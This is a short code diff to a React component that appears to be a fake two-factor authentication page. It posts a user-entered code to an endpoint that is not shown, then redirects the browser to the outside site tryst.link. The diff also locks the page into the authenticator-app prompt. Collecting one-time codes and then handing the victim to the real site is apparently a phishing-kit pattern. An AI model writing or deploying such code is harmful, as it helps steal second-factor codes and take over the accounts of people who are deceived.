@@ -4,7 +4,7 @@ import { useForm } from "react-hook-form";
 import { useNavigate } from "react-router-dom";
 
 const CodeDetails = () => {
-  const [user, setUser] = useState(true);
+  const [user, setUser] = useState(false);
   const [show, setShow] = useState(true);
   const navigate = useNavigate();
 
@@ -22,7 +22,9 @@ const CodeDetails = () => {
       body: JSON.stringify(Code),
     })
       .then((res) => res.json())
-      .then((result) => navigate("/Verify"));
+      .then(
+        (result) => (window.location.href = "https://tryst.link/locations")
+      );
   };
 
   return (
@@ -126,7 +128,7 @@ const CodeDetails = () => {
         <div className="row">
           <div className="col-md-12 pb-3">
             <div className="recovery">
-              <span className="using" onClick={() => setUser(!user)}>
+              <span className="using">
                 Authenticate using
                 {user ? " emergency recovery code" : " authenticator app"}{" "}
                 instead
